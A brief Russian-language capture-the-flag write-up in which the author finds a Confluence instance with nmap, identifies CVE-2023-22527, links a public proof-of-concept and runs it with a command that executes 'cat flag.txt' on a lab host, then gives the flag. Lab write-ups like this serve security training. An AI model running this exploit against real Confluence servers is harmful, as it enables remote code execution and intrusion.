# Confluence 1

На порту 8090 через nmap находим инстанс Confluence. Погуглив, находим CVE-2023-22527, позволяющую получить RCE. Находим [PoC](https://github.com/Manh130902/CVE-2023-22527-POC) для этой уязвимости. Запускаем скрипт, читаем флаг:
```bash
python3 CVE-2023-22527.py --target http://10.10.1.159:8090 --cmd 'cat flag.txt'
```

**Флаг: ** `nto{c0nflu3nc3_15_und3r_4774ck}`